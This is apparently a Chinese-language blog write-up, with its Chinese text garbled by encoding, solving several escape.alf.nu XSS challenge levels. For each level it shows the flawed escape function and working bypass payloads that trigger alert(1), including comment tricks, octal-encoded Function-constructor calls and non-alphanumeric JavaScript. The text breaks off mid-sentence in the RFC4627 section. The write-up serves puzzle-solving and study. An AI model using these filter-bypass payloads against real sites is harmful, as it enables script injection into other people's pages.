<h1 id="JSON-1"><a href="#JSON-1" class="headerlink" title="JSON ]["></a>JSON ][</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = <span class="built_in">JSON</span>.stringify(s).replace(<span class="regexp">/&lt;\/script/gi</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log('</span> + s + <span class="string">');&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜ä¹ŸæŒºæœ‰æ„æ€çš„ã€‚æ ¼å¼åŒ–ä¹‹åå†æŠŠ<code>&lt;/script</code>æ›¿æ¢æˆç©ºä¸²ã€‚ä½¿ç”¨ä¸€ç‚¹æŠ€å·§å°±å¯ä»¥ç»•è¿‡äº†ã€‚<br>solution(35): <code>&lt;/scr&lt;/scriptipt&gt;&lt;script&gt;alert(1)//</code><br><br><br><br><br></p>
<h1 id="Callback-1"><a href="#Callback-1" class="headerlink" title="Callback ]["></a>Callback ][</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Pass inn "callback#userdata"</span></span><br><span class="line">  <span class="keyword">var</span> thing = s.split(<span class="regexp">/#/</span>); </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/^[a-zA-Z\[\]']*$/</span>.test(thing[<span class="number">0</span>])) <span class="keyword">return</span> <span class="string">'Invalid callback'</span>;</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;<span class="string">'userdata'</span>: thing[<span class="number">1</span>] &#125;;</span><br><span class="line">  <span class="keyword">var</span> json = <span class="built_in">JSON</span>.stringify(obj).replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"&lt;script&gt;"</span> + thing[<span class="number">0</span>] + <span class="string">"("</span> + json +<span class="string">")&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å’Œä¸Šé¢çš„é¢˜ç›®<a href="#Callback">Callback</a>ä¸€æ ·ï¼Œåªæ˜¯å› ä¸ºè¿‡æ»¤äº†<code>/</code>ï¼Œä¸èƒ½ç”¨<code>//</code>æ³¨é‡Šäº†è€Œå·²ï¼Œé‚£å°±æ¢ä¸€ç§æ³¨é‡Šæ–¹å¼å§<br>solution(16): <code>&#39;#&#39;;alert(1)&lt;!--</code><br><br><br><br><br></p>
<h1 id="Skandia-1"><a href="#Skandia-1" class="headerlink" title="Skandia ]["></a>Skandia ][</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  if (/[&lt;&gt;]/.test(s)) return &apos;-&apos;;</span><br><span class="line"></span><br><span class="line">  return &apos;&lt;script&gt;console.log(&quot;&apos; + s.toUpperCase() + &apos;&quot;)&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆè€ƒè™‘åˆ°å¯ä»¥é—­åˆ<code>script</code>æ ‡ç­¾ï¼Œä½†æ˜¯è¿™é¢˜è¿‡æ»¤äº†å°–æ‹¬å·ï¼Œæƒ³åˆ°ä¸Šä¸€é¢˜<a href="#Template">Template</a>çš„æ–¹æ³•ï¼Œå³ç”¨åå…­è¿›åˆ¶æˆ–å…«è¿›åˆ¶æ¥è¡¨ç¤ºå°–æ‹¬å·ï¼Œä½†æ˜¯ç»è¿‡æµ‹è¯•å‘ç°ï¼Œåœ¨è¿™é¢˜å¹¶ä¸ç®¡ç”¨ã€‚æƒ³ä¸æ˜ç™½ä¸ºç”šä¹ˆï¼Œä½†æ˜¯æµ‹è¯•ç»“æœæ˜¯ï¼šå­—ç¬¦ä¸²çš„<code>replace</code>æ–¹æ³•æ˜¯è®¤ä¸å‡ºåå…­è¿›æˆ–è€…å…«è¿›åˆ¶ä»£è¡¨çš„å­—ç¬¦çš„ï¼Œä½†æ˜¯<code>test</code>æ–¹æ³•å´å¯ä»¥ã€‚æ‰€ä»¥ä¸Šä¸€é¢˜Templateç”¨çš„è¿‡æ»¤æ–¹æ³•replaceè¿‡æ»¤<code>&lt;</code>æ‹¬å·æ—¶ï¼Œç”±äºæˆ‘ä»¬ç”¨äº†<code>\74</code>æ¥è¡¨ç¤ºï¼Œè€Œreplaceæ–¹æ³•å¹¶ä¸è®¤è¯†å®ƒï¼Œæ‰€ä»¥ç»•è¿‡äº†è¿‡æ»¤ã€‚ä½†æ˜¯è¿™é¢˜ç”¨äº†<code>test</code>æ–¹æ³•ï¼Œé¢å¯¹åŒæ ·çš„æƒ…å†µï¼Œå®ƒçŸ¥é“<code>\74</code>å³ä»£è¡¨ç€<code>&lt;</code>ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ— æ•ˆäº†ã€‚<br>æ—¢ç„¶ä¸èƒ½é—­åˆ<code>script</code>ï¼Œé‚£å°±å¯ä»¥è€ƒè™‘é—­åˆ<code>log</code>ï¼Œåº”è¯¥æ³¨å…¥çš„payloadæ˜¯<code>&quot;);alert(1)//</code>ï¼Œä½†æ˜¯alertè½¬ä¸ºå¤§å†™å°±ä¸è¡Œäº†ã€‚æ­¤æ—¶æœ€ç®€å•ç²—æš´çš„æ–¹æ³•æ˜¯ç›´æ¥ç”¨<a href="http://utf-8.jp/public/jjencode.html" target="_blank" rel="noopener">jjencode</a>( an online non-alphanumeric encoder)ã€‚å°†<code>alert(1)</code>ç”¨jjencode encodeå¾—åˆ°çš„è½¬ç åçš„ç»“æœï¼Œç”±äºç»“æœå¤ªé•¿äº†ï¼Œæ‰€ä»¥ç”¨jjencodeä»£è¡¨ï¼Œåˆ™<br>solutioon(538)ä¸º: <code>&quot;);jjencode//</code></p>
<p>ä½†æ˜¯538ä¸ªå­—ç¬¦è¿˜æ˜¯å¤ªé•¿äº†ã€‚åœ¨<a href="http://www.pwntester.com/blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/" target="_blank" rel="noopener">pwntester</a>çš„åšå®¢é‡Œçœ‹åˆ°äº†ä¸€ä¸ªæ›´å¥½çš„åŠæ³•ã€‚<br>é¦–å…ˆåº”è¯¥æ³¨å…¥çš„payloadæ˜¯<code>&quot;+alert(1))//&quot;</code><br>ä½†æ˜¯è¦æƒ³åŠæ³•ç”¨ç›¸ç­‰æ•ˆæœçš„è¯­å¥æ›¿æ¢æ‰alert(1)ã€‚<br>åœ¨åšå®¢ä¸Šçœ‹åˆ°ä¸€ä¸ªæ–¹æ³•ä¹Ÿå¯ä»¥è§¦å‘alert(1)</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][<span class="string">"sort"</span>][<span class="string">"constructor"</span>](<span class="string">"alert(1)"</span>)()</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå…³é”®åœ¨äº<code>Function(&quot;code&quot;)</code>ã€‚å®ƒå¯ä»¥å°†å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ è¿›å»ï¼Œè¿”å›ä¸€ä¸ªä»¥ä¼ è¿›å»çš„å­—ç¬¦ä¸²ä¸ºå‡½æ•°ä½“çš„åŒ¿åå‡½æ•°ã€‚æ‰€ä»¥è¿™ä¸ªå‡½æ•°å¯ä»¥è®©ä½ å°†å­—ç¬¦ä¸²å½“ä½œä»£ç æ¥æ‰§è¡Œã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>[][&#39;sort&#39;][&#39;constructor&#39;]</code>æ¥è·å¾—è¿™ä¸ªå‡½æ•°ã€‚<br><img src="/image/3.png" alt><br>é¡ºä¾¿ç®€å•è¯´ä¸€ä¸‹ï¼Œ<code>[]</code>å®šä¹‰äº†ä¸€ä¸ªç©ºæ•°ç»„ï¼Œæ•°ç»„è‡ªå¸¦äº†å¾ˆå¤šæ–¹æ³•ï¼Œ<code>sort</code>æ˜¯å…¶ä¸­ä¸€ä¸ªï¼Œè¿˜æœ‰å¾ˆå¤šæ–¹æ³•ï¼Œéšä¾¿ç”¨ä¸€ä¸ªéƒ½è¡Œï¼Œè¿™é‡Œå°±ç”¨äº†sortã€‚<code>[][&quot;sort&quot;]</code>çš„æ•ˆæœç›¸å½“äº<code>[].sort</code>ã€‚<br>æ‰€æœ‰payloadå¯ä»¥æ”¹ä¸º<code>&quot;+[][&quot;sort&quot;][&quot;constructor&quot;](&quot;alert(1)&quot;)())+&quot;</code><br>æ­¤æ—¶åˆå¤šäº†ä¸€ä¸ªæ–°çš„é—®é¢˜ï¼Œç”¨ä»€ä¹ˆæ¥ä»£æ›¿ä¸Šé¢çš„ä¸‰ä¸ªå­—ç¬¦ä¸²å‘¢ï¼Ÿ<br>è¿™æ—¶å€™å°±å¯ä»¥ç”¨é¢˜ç›®Templateä¸­ç”¨åˆ°çš„æ–¹æ³•äº†ï¼Œç”¨å…«è¿›åˆ¶æ¥ä»£æ›¿å­—æ¯ã€‚<br>æ‰€ä»¥ç­”æ¡ˆå°±å‡ºæ¥äº†ï¼š<br>solution(99): <code>&quot;+[][&quot;\160\157\160&quot;][&quot;\143\157\156\163\164\162\165\143\164\157\162&quot;](&#39;\141\154\145\162\164(1)&#39;)()+&quot;</code>  </p>
<p><br><br><br><br></p>
<h1 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> tag = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// For this one, you get to run any code you want, but in a "sandboxed" iframe.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// https://4i.am/?...raw=... just outputs whatever you pass in.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Alerting from 4i.am won't count.</span></span><br><span class="line"></span><br><span class="line">  s = <span class="string">'&lt;script&gt;'</span> + s + <span class="string">'&lt;\/script&gt;'</span>;</span><br><span class="line">  tag.src = <span class="string">'https://4i.am/?:XSS=0&amp;CT=text/html&amp;raw='</span> + <span class="built_in">encodeURIComponent</span>(s);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">window</span>.WINNING = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; youWon = <span class="literal">true</span>; &#125;;</span><br><span class="line"></span><br><span class="line">  tag.setAttribute(<span class="string">'onload'</span>, <span class="string">'youWon &amp;&amp; alert(1)'</span>);</span><br><span class="line">  <span class="keyword">return</span> tag.outerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜å…¶å®ä¹ŸæŒºå¥½ç©çš„ï¼Œå¦‚æœæ¯”è¾ƒç†Ÿæ‚‰iframeçš„ç‰¹æ€§çš„è¯ï¼Œå…¶å®ä¹Ÿå¾ˆç®€å•å¾ˆå¿«å°±åšå‡ºæ¥äº†ï¼Œä½†æ˜¯å¦‚æœä¸çŸ¥é“çš„è¯ï¼Œé‚£å°±æŒºèŠ±æ—¶é—´çš„äº†ã€‚<br>è¿™é¢˜å…³é”®åœ¨äºä½¿å¾—<code>youWon</code>è¿™ä¸ªå˜é‡çš„å€¼ä¸ºtrueï¼Œç„¶åå°±å¯ä»¥è§¦å‘alert(1)äº†ã€‚é¦–å…ˆçœ‹ä¸€ä¸‹æˆ‘ä»¬æ³¨å…¥çš„åœ°æ–¹æ˜¯ä¸€ä¸ªURLï¼Œé¢˜ç›®æœ‰è¯´ï¼Œè¿™ä¸ªurlé¡µé¢è¿”å›çš„é¡µé¢å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ã€‚ä¹Ÿå°±æ˜¯è¯´iframeçš„å†…å®¹æ˜¯ç”±æˆ‘ä»¬å†³å®šçš„ã€‚<br>æˆ‘ä»¬çš„è¾“å…¥ä¼šåŒ…è£¹åœ¨ä¸€ä¸ª<code>script</code>æ ‡ç­¾é‡Œé¢ã€‚<br>è¦åšå‡ºè¿™é“é¢˜ï¼Œæˆ‘ä»¬è¦çŸ¥é“ä¸¤ç‚¹iframeçš„ç‰¹æ€§</p>
<ol>
<li>iframeçš„nameå±æ€§å€¼ï¼ŒåŒæ—¶ä¼šæ³¨å…¥åˆ°çˆ¶é¡µé¢çš„å…¨å±€çª—å£å¯¹è±¡ä¸­ã€‚</li>
<li>iframeçš„nameå±æ€§ï¼Œåˆ™iframeçš„window.nameçš„å€¼åŒæ—¶ä¼šè®¾ç½®ä¸ºè¿™ä¸ªnameå±æ€§å€¼ã€‚åè¿‡æ¥ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œä¸è¿‡æœ‰ä¸ªå‰ææ—¶iframeå¹¶æ²¡æœ‰è®¾ç½®nameå±æ€§ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœè®¾ç½®äº†iframeçš„window.nameï¼ŒåŒæ—¶ä¹Ÿä¼šå°†iframeçš„nameå±æ€§å€¼è®¾ç½®ä¸ºåŒæ ·çš„å€¼ï¼ˆå‰ææ˜¯å®ƒä¸å­˜åœ¨çš„è¯ï¼Œä¸èƒ½è¢«è¦†ç›–ï¼‰</li>
</ol>
<p>æ‰€ä»¥ï¼Œç­”æ¡ˆå‡ºæ¥äº†ã€‚<br>solution(13)ï¼š <code>name=&#39;youWon&#39;</code><br><br><br><br><br></p>
<h1 id="TI-S-M"><a href="#TI-S-M" class="headerlink" title="TI(S)M"></a>TI(S)M</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">json</span>(<span class="params">s</span>) </span>&#123; <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify(s).replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">html</span>(<span class="params">s</span>) </span>&#123; <span class="keyword">return</span> s.replace(<span class="regexp">/[&lt;&gt;"&amp;]/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">'&amp;#'</span> + s.charCodeAt(<span class="number">0</span>) + <span class="string">';'</span>; &#125;); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="string">'&lt;script&gt;'</span> +</span><br><span class="line">      <span class="string">'var url = '</span> + json(s) + <span class="string">'; // We\'ll use this later '</span> +</span><br><span class="line">    <span class="string">'&lt;/script&gt;\n\n'</span> +</span><br><span class="line">    <span class="string">'  &lt;!-- for debugging --&gt;\n'</span> +</span><br><span class="line">    <span class="string">'  URL: '</span> + html(s) + <span class="string">'\n\n'</span> +</span><br><span class="line">    <span class="string">'&lt;!-- then suddenly --&gt;\n'</span> +</span><br><span class="line">    <span class="string">'&lt;script&gt;\n'</span> +</span><br><span class="line">    <span class="string">'  if (!/^http:.*/.test(url)) console.log("Bad url: " + url);\n'</span> +</span><br><span class="line">    <span class="string">'  else new Image().src = url;\n'</span> +</span><br><span class="line">    <span class="string">'&lt;/script&gt;'</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜æ€è·¯ä¹Ÿæ˜¯ç”±åˆšåˆšé‚£ä¸ªåšä¸»æä¾›çš„ã€‚åŸç†æˆ‘æš‚æ—¶ä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥šã€‚å¤§æ¦‚æ„æ€å°±æ˜¯åœ¨HTML5ä¸­å¦‚æœé‡åˆ°<code>&lt;!--&lt;script&gt;</code>ï¼Œå°±ä¼šè®¤ä¸ºæ¥ä¸‹çš„ä»£ç æ˜¯JSä»£ç ï¼Œç›´åˆ°é‡åˆ°ç»“æŸçš„<code>script</code>æ ‡ç­¾ï¼Œä½†æ˜¯å¿…é¡»å¾—ä¿è¯æœ‰ç›¸åº”çš„<code>-&gt;</code>ï¼Œå¦åˆ™ä¼šè®¤ä¸ºè¯­æ³•å‡ºé”™çš„ã€‚<br>å…·ä½“çš„å†…å®¹å¯ä»¥åˆ°åˆšåˆšé‚£ä¸ªåšä¸»é‡Œçœ‹å§ï¼Œæˆ‘å°±ç›´æ¥ç»™å‡ºç­”æ¡ˆäº†ã€‚<br>solution(25): <code>if(alert(1)/*&lt;!--&lt;script&gt;</code><br><br><br><br><br></p>
<h1 id="JSON-â…¢"><a href="#JSON-â…¢" class="headerlink" title="JSON â…¢"></a>JSON â…¢</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> s.split(<span class="string">'#'</span>).map(<span class="function"><span class="keyword">function</span>(<span class="params">v</span>) </span>&#123;</span><br><span class="line">      <span class="comment">// Only 20% of slashes are end tags; save 1.2% of total</span></span><br><span class="line">      <span class="comment">// bytes by only escaping those.</span></span><br><span class="line">      <span class="keyword">var</span> json = <span class="built_in">JSON</span>.stringify(v).replace(<span class="regexp">/&lt;\//g</span>, <span class="string">'&lt;\\/'</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log('</span>+json+<span class="string">')&lt;/script&gt;'</span>;</span><br><span class="line">      &#125;).join(<span class="string">''</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨ä¸Šä¸€é¢˜çš„åŠæ³•å°±å¯ä»¥åšå‡ºæ¥äº†ã€‚<br>solution(29): <code>&lt;!--&lt;script&gt;#)/;alert(1)//--&gt;</code><br>åˆ†æä¸€ä¸‹è¿™ä¸ªç­”æ¡ˆã€‚<br>è¾“å…¥è¿™ä¸ªç­”æ¡ˆï¼Œä¼šè¾“å…¥å¦‚ä¸‹ç»“æœï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">console</span>.log(<span class="string">"&lt;!--&lt;script&gt;"</span>)&lt;<span class="regexp">/script&gt;&lt;script&gt;console.log(")/</span>;alert(<span class="number">1</span>)<span class="comment">//--&gt;")&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>å› ä¸ºæˆ‘ä»¬æ³¨å…¥äº†<code>&lt;!--&lt;script&gt;</code>ï¼Œå¯¼è‡´parserå°†è¿™ä¸€æ®µéƒ½å½“ä½œJSæ¥å¤„ç†ã€‚</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"&lt;!--&lt;script&gt;"</span>)&lt;<span class="regexp">/script&gt;&lt;script&gt;console.log(")/</span>;alert(<span class="number">1</span>)<span class="comment">//--&gt;")</span></span><br></pre></td></tr></table></figure>

<p>jså¼•æ“ä¼šè§£ææˆå¦‚ä¸‹çš„æ ·å­ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(&quot;junk_string&quot;) &lt; /junk_regexp/ ; alert(1) // --&gt;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<br>junk_stringä»£è¡¨ï¼š <code>&lt;!--&lt;script&gt;</code><br>junk_regexpä»£è¡¨ï¼š <code>script&gt;&lt;script&gt;console.log(&quot;&quot;)</code><br>æˆ‘ä»¬çš„solutionä¸­æ³¨å…¥çš„å…¶ä¸­ä¸¤ä¸ªå­—ç¬¦<code>)/</code>å°±ä¸ºäº†æ¬ºéª—JSå¼•æ“ï¼ŒJSå¼•æ“ä¼šå°†ä¸¤ä¸ªæ–œæ ä¹‹é—´çš„å†…å®¹å½“ä½œæ­£åˆ™è¡¨è¾¾å¼å¤„ç†ï¼Œç”¨è¿™ä¸ªåŠæ³•æ¥é—­åˆæ‰è¿™äº›å¤šä½™çš„å­—ç¬¦ã€‚<br><br><br><br><br></p>
<h1 id="Skandia-â…¢"><a href="#Skandia-â…¢" class="headerlink" title="Skandia â…¢"></a>Skandia â…¢</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="regexp">/[\\&lt;&gt;]/</span>.test(s)) <span class="keyword">return</span> <span class="string">'-'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s.toUpperCase() + <span class="string">'")&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜å’Œä¸Šä¸€é¢˜<code>Skandia ][</code>å·®ä¸å¤šçš„åšæ³•ã€‚ä¸è¿‡å› ä¸ºè¿‡æ»¤å¤šäº†ä¸€ä¸ªåæ–œæ†ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨å…«è¿›åˆ¶æ¥ä»£æ›¿äº†ã€‚é‚£å°±è¦æ¢ä¸€ç§æ€è·¯ã€‚<br>å…ˆæ¥çœ‹çœ‹ä¸‹é¢çš„è¡¨æ ¼ã€‚<br><img src="/image/1.png" alt><br>è¿™é‡Œçš„è¡¨æ ¼æ˜¯è¯´ï¼Œå·¦è¾¹çš„è¾“å…¥æ˜¯å¯ä»¥è¿”å›å³è¾¹çš„å­—ç¬¦ä¸²çš„ã€‚å¤§å®¶å¯ä»¥åœ¨è¯•è¯•ã€‚<br>æ‰€ä»¥å¯ä»¥ç”¨è¿™ä¸ªåŠæ³•æ¥è·å–æˆ‘ä»¬éœ€è¦çš„å­—ç¬¦ä¸²<br><img src="/image/2.png" alt><br>æ‰€ä»¥æœ€åçš„payload(246):</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"+[][(''+!1)[3]+(''+&#123;&#125;)[1]+(''+!0)[1]+(''+!0)[0]][(''+&#123;&#125;)[5]+(''+&#123;&#125;)[1]+(''+&#123;&#125;[0])[1]+(''+!1)[3]+(''+!0)[0]+(''+!0)[1]+(''+!0)[2]+(''+&#123;&#125;)[5]+(''+!0)[0]+(''+&#123;&#125;)[1]+(''+!0)[1]]((''+!1)[1] + (''+!1)[2] + (''+!1)[4] +(''+!0)[1]+(''+!0)[0]+"</span>(<span class="number">1</span>)<span class="string">")())//`</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœæŠŠæˆ‘ä»¬æ‰€éœ€è¦çš„å­—æ¯éƒ½èµ‹ç»™ä¸€ä¸ªå˜é‡ï¼Œé‚£ä¹ˆè¿™ä¸ªpayloadå¯ä»¥æ›´çŸ­ä¸€äº›</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=<span class="string">''</span>+!<span class="number">1</span>+!<span class="number">0</span>+&#123;&#125;[<span class="number">0</span>]+&#123;&#125;  <span class="comment">//_="falsetrueundefined[object Object]"</span></span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥payloadå¯ä»¥ç¼©çŸ­æˆ144ä¸ªå­—ç¬¦ï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">");_=''+!1+!0+&#123;&#125;[0]+&#123;&#125;;[][_[3]+_[19]+_[6]+_[5]][_[23]+_[19]+_[10]+_[3]+_[5]+_[6]+_[7]+_[23]+_[5]+_[19]+_[6]](_[1]+_[2]+_[4]+_[6]+_[5]+'(1)')()//</span></span><br></pre></td></tr></table></figure>

<p><br><br><br><br></p>
<h1 id="RFC4627"><a href="#RFC4627" class="headerlink" title="RFC4627"></a>RFC4627</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">text</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">window</span>.the_easy_but_expensive_way_out = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; alert(i++) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// "A JSON text can be safely passed into JavaScript's eval() function</span></span><br><span class="line"><span class="comment">// (which compiles and executes a string) if all the characters not</span></span><br><span class="line"><span class="comment">// enclosed in strings are in the set of characters that form JSON</span></span><br><span class="line"><span class="comment">// tokens."</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(<span class="regexp">/[^,:&#123;&#125;\[\]0-9.\-+Eaeflnr-u \n\r\t]/</span>.test(</span><br><span class="line">          text.replace(<span class="regexp">/"(\\.|[^"\\])*"/g</span>, <span class="string">''</span>)))) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123; </span><br><span class="line">      <span class="keyword">var</span> val = <span class="built_in">eval</span>(<span class="string">'('</span> + text + <span class="string">')'</span>);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">''</span> + val);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'Crashed: '</span>+_);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Rejected.'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ®è¯´è¿™é¢˜æ˜¯åŸºäºçœŸå®çš„æ¡ˆä¾‹ï¼Œ<a href="https://twitter.com/WisecWisec" target="_blank" rel="noopener">Stefano Di Paola</a>è®°è½½åœ¨è¿™ç¯‡<a href="http://blog.mindedsecurity.com/2011/08/ye-olde-crockford-json-regexp-is.html" target="_blank" rel="noopener">æ–‡ç« </a>ä¸­ã€‚<br>ä»”ç»†çœ‹ä¸€ä¸‹è¿™ä¸ªè¡¨è¾¾å¼ï¼Œå®ƒæ˜¯å…è®¸æˆ‘ä»¬è¾“å…¥<code>self</code>çš„ï¼Œå¦‚æœæ˜¯è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å®ƒæ¥è°ƒç”¨å…¨å±€å‡½æ•°<code>the_easy_but_expensive_way_out</code>äº†ã€‚<br>è¿™é¢˜çš„æŠ€å·§å°±æ˜¯è®©ä¸€ä¸ªå¯¹è±¡å’Œä¸€ä¸ªå€¼æˆ–è€…ä¸€ä¸ªå­—ç¬¦ç›¸åŠ ã€‚è¿™æ 